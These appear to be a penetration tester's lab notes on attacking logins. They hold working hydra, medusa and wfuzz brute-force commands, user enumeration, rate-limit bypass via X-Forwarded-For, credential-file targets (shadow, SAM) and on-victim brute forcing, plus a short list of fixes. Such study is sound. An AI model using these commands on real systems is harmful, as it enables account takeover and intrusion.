# Login Brute Forcing

> Status: ✅ Complete
> Date started: 2026-10-26
> Date finished: 2026-10-26

## 1. Goal
Attack authentication: enumerate users, brute-force passwords / tokens / 2FA, bypass rate limits, and abuse session handling. (Broken Authentication, OWASP A07.)

## Files that hold crackable hashes
Found these on a box → pull them off and crack offline instead of hammering a live login:
| Windows | Linux |
|---|---|
| `SAM` (+ `SYSTEM`) | `/etc/shadow` (+ `shadow.bak`) |
| `unattend.xml` | `/etc/passwd` |
| `sysprep.inf` | |

## User enumeration
Different responses/timing for valid vs invalid users leak valid accounts.
```bash
wfuzz -c -z file,users.txt "http://t/login?username=FUZZ"   # watch for response/length diff
# also: distinct error messages ("invalid password" vs "unknown user"), timing
```

## Brute forcing
```bash
# password brute (tune the failure string)
hydra -l <user> -P rockyou.txt t http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid username or password"
# password reset tokens (weak/predictable)
wfuzz -c -z file,tokens.txt "http://t/reset?token=FUZZ"
# 2FA/OTP (when no rate limit) — 6-digit space is only 1,000,000
# offline hash cracking:  hashcat -m <mode> hashes rockyou.txt
```

## Bypassing protections
```bash
curl -H "X-Forwarded-For: 1.2.3.4" http://t/login   # rotate this header to beat per-IP rate limits
```
CAPTCHA sometimes leaks the answer in HTML/response, or isn't checked server-side. Default creds: check CIRT.net / SecLists.

## Brute-force tools & wordlists
```bash
# hydra (network login cracker, many protocols)
hydra -l admin -P rockyou.txt ssh://<ip>
hydra -L users.txt -P pass.txt ftp://<ip>
hydra -l admin -P pass.txt <ip> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
hydra -C user_pass.txt ssh://<ip>        # combined user:pass file (colon-separated)
hydra -L users.txt -P pass.txt -u -f <ip> -s <port> http-get /   # HTTP Basic Auth
# medusa (parallel alternative)
medusa -h <ip> -U users.txt -P pass.txt -M ssh -t 5
```
Default-cred wordlists (SecLists): `Passwords/Default-Credentials/*-betterdefaultpasslist.txt`, `Passwords/Leaked-Databases/rockyou-10.txt` (tiny, fast first pass). `-u` loops users-outer/pass-inner, `-f` stops at first hit.

**Brute internal services from inside the victim** (a service bound to `127.0.0.1` isn't reachable from outside):
```bash
netstat -antp | grep -i list     # find LISTENing internal services + ports
scp -P <port> ./wordlist.txt user@<victim>:/tmp    # push your wordlist over (needs creds)
hydra -l <user> -P /tmp/wordlist.txt ftp://127.0.0.1   # run hydra ON the victim, against localhost
```
**Custom wordlists:**
- `username-anarchy Jane Smith` / `-i names.txt` → likely username formats (feed from SecLists Names).
- `cupp -i` → profile a target (name, DOB, pet) into a tailored password list.
- **Filter a list to the password policy** (don't waste guesses on invalid ones):
  ```bash
  grep -E '^.{8,}$' wordlist.txt | grep -E '[A-Z]' | grep -E '[0-9]'   # 8+ chars, upper, digit
  # sed equivalents (delete non-matching lines in place):
  sed -ri '/^.{,7}$/d' wl.txt                         # drop < 8 chars
  sed -ri '/[0-9]+/!d' wl.txt                         # keep only lines with a digit
  sed -ri '/[!-/:-@\[-`\{-~]+/!d' wl.txt              # keep only lines with a special char
  ```

## Session attacks
- **Weak session IDs** (low entropy) → brute: `wfuzz -b "sessionid=FUZZ" ...` (slow).
- **Session fixation:** attacker sets a known session ID, victim logs in with it, attacker reuses it. **Fix: regenerate the session ID on login.**
- **No timeout / no invalidation on logout** → stolen/old sessions stay valid.

## Fix
Generic login errors (no user enum), rate limiting + lockout (server-side, not per-IP only), strong CAPTCHA, MFA done right, CSPRNG session IDs, regenerate on login, proper timeouts, no default creds.

> Two highest-value checks: username enumeration (different error/timing) to build a target list, then spray — and always test whether rate limiting is only per-IP (beatable with `X-Forwarded-For`). Session fixation hinges on one fix: regenerate the ID at login.

## My notes / lab output
Filled in as I run these on lab targets.

## Full command reference (source notes)
Complete command set — nothing trimmed.

**Hash-bearing files** (grab + crack offline)
| Windows | Linux |
|---|---|
| `unattend.xml`, `sysprep.inf`, `SAM` | `shadow`, `shadow.bak`, `password` / `passwd` |

**Hydra**
| Command | Description |
|---|---|
| `hydra -h` | Help |
| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /` | Basic Auth brute, combined list |
| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /` | Basic Auth, user/pass lists |
| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Login form, static user |
| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH, user/pass lists |
| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1` | FTP, static user |
| `hydra -l b.gates -P william.txt ssh://<ip>:<port>` | SSH brute a specific user |
| `hydra -L names.txt -P rockyou-10.txt -f <ip> -s <port> http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Login form, default passwords |

**Wordlists**
| Path | Description |
|---|---|
| `/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | Default passwords |
| `/usr/share/wordlists/rockyou.txt` | Most common passwords |
| `/usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt` | rockyou-10 (92 entries, fast first pass) |
| `/usr/share/seclists/Usernames/Names/names.txt` | Common names |

**Personalized wordlists & follow-up**
| Command | Description |
|---|---|
| `cupp -i` | Build a custom password list interactively |
| `sed -ri '/^.{,7}$/d' william.txt` | Remove passwords shorter than 8 |
| `sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt` | Remove passwords with no special chars |
| `sed -ri '/[0-9]+/!d' william.txt` | Remove passwords with no numbers |
| `./username-anarchy Bill Gates > bill.txt` | Generate a usernames list |
| `ssh b.gates@SERVER_IP -p PORT` | SSH to the server |
| `ftp 127.0.0.1` | FTP to the server (internal) |
| `su - user` | Switch user with a found password |
| `netstat -antp \| grep -i list` | Find internal listening services |
| `scp -P 53718 ./william.txt b.gates@<ip>:/tmp` | Copy wordlist to the target |
| `hydra -l m.gates -P /tmp/william.txt ftp://127.0.0.1` | Run hydra on the victim vs internal FTP |

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
